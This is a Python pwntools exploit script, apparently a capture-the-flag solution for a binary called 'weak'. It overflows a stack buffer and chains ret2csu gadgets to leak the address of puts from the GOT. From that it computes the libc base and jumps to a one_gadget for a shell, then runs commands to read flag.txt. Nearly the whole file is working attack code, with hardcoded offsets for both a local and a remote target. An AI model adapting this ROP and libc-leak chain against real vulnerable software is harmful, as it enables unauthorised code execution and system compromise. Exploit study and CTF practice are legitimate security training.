from pwn import *
import time

"""
0000000000400521         pop        rbx
0000000000400522         pop        rbp
0000000000400523         ret
"""
"""
0000000000400640         mov        r12, qword [rsp+0x38+var_20]
0000000000400645         mov        r13, qword [rsp+0x38+var_18]
000000000040064a         mov        r14, qword [rsp+0x38+var_10]
000000000040064f         mov        r15, qword [rsp+0x38+var_8]
0000000000400654         add        rsp, 0x38
0000000000400658         ret
"""
"""
0x0000000000400620 : mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]
"""
"""
0x0000000000400621 : mov edx, edi ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]
"""
"""
0x0000000000400637 : mov ebx, dword ptr [rsp + 8] ; mov rbp, qword ptr [rsp + 0x10] ; mov r12, qword ptr [rsp + 0x18] ; mov r13, qword ptr [rsp + 0x20] ; mov r14, qword ptr [rsp + 0x28] ; mov r15, qword ptr [rsp + 0x30] ; add rsp, 0x38 ; ret
"""
ret = 0x400591
main = 0x0400592
puts_got = 0x6009e8
puts_plt = 0x400430
DEBUG = True#False#

if DEBUG == True:
    puts_off = 0x000809c0
    system_off = 0x0004f440
    bin_sh_off = 0x001b3e9a
    one_shot = 0x10a38c
    r = process("./weak")
else:
    puts_off = 0x06fb70
    system_off = 0x045210
    bin_sh_off = 0x17bcaf
    one_shot = 0x450dd
    r = process("./connect.sh")

r.recvuntil("Ok, now give me the name of our president.")
if DEBUG == True:
    gdb.attach(r)
p = ''
p += "A"*24
p += p64(0x0000000000400637)
p += "junkjunk"
p += p64(0x0)+p64(0x1)+p64(puts_got)+p64(puts_got)+"E"*8+"F"*8#putting on the stack argumnts for the 0x0000000000400637 gadgets
p += p64(0x0000000000400620)
p += p64(main)*8
#p += "A"*8+"B"*8+"C"*8+"D"*8+"E"*8+"F"*8
r.sendline(p)
r.recvuntil("Oh I remember !\n")
leak = r.recv(6)
print hexdump(leak)
leak = u64(leak+"\x00\x00")
log.success("leaked puts: " + hex(leak))
libc_base = leak - puts_off
log.success("libc_base at: " + hex(libc_base))
p = ''
p += "A"*24
p += p64(libc_base + one_shot)
p += "\x00"*400#this will make the one_gadget work!!! condition is: rsp+140==NULL
r.sendline(p)
time.sleep(0.2)
r.sendline("id;ls -al;cat flag.txt")
r.interactive()
